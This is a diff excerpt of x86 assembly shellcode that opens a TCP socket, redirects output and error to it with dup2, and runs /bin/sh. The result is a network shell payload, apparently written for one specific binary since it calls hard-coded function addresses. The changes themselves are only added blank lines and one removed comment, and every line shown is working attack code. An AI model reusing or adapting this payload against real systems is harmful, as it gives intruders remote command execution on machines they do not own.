@@ -10,12 +10,14 @@ mov dword ptr [ebp-0x0c], 0	# struct sockaddr_in
 mov dword ptr [ebp-0x08], 0	# struct sockaddr_in
 mov dword ptr [ebp-0x04], 0	# struct sockaddr_in
 
+
 push	0				# protocol
 push	1				# type
 push	2				# family
 mov		eax, 0x08048730	# socket
 call	eax				# sockfd = socket(AF_INET, SOCK_STREAM, 0)
 mov		esi, eax
+
 
 push	4				# optlen
 lea		eax, [ebp-0x18]
@@ -62,12 +64,13 @@ push	esi				# insert fildes (socket fd)
 mov		eax, 0x08048600	# dup2(socketfd, 1)
 call	eax
 
+
 push	2 					# insert fildes2
 push	esi 				# insert fildes (socket fd)
 mov		eax, 0x08048600 	# dup2(socketfd, 2)
 call	eax
 
-# execve("/bin//sh", ["/bin//sh",NULL], NULL)
+
 mov		al, 0xb   	# execve() = 0xb
 xor		edx, edx	# envp
 push	0x0068732f	# "//sh"
@@ -78,6 +81,7 @@ push	0			# NULL terminator for argv[1]
 push	ebx			# filename for argv[0]
 mov		ecx, esp	# argv
 int		0x80		# execve("/bin/sh", ["/bin/sh", NULL], NULL)
+
 
 _GET_STRINGS:
 call _SHELLCODE
